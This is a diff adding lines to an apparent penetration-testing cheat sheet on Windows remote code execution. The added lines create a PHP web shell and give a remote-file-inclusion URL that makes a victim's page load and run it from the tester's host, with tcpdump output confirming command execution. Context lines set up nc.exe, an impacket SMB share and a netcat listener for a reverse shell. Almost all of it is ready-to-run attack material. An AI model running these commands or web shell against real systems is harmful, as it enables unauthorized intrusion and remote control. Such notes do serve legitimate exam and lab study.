@@ -1114,6 +1114,18 @@ http://192.168.119.146/test.hta
 ## Exploitation <img src="https://cdn-icons-png.flaticon.com/512/2147/2147286.png" width="40" height="40" />
 ### Windows rce techniques
 ````
+cat shell.php                   
+echo '<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>' > shell.php
+
+http://<$Victim>/site/index.php?page=http://<Your $IP>:80/shell.php&cmd=ping <Your $IP>
+
+tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+20:27:03.538792 IP 192.168.153.53 > 192.168.45.191: ICMP echo request, id 1, seq 1, length 40
+20:27:03.539661 IP 192.168.45.191 > 192.168.153.53: ICMP echo reply, id 1, seq 1, length 40
+````
+
+````
 locate nc.exe
 impacket-smbserver -smb2support Share .
 nc -nlvp 80
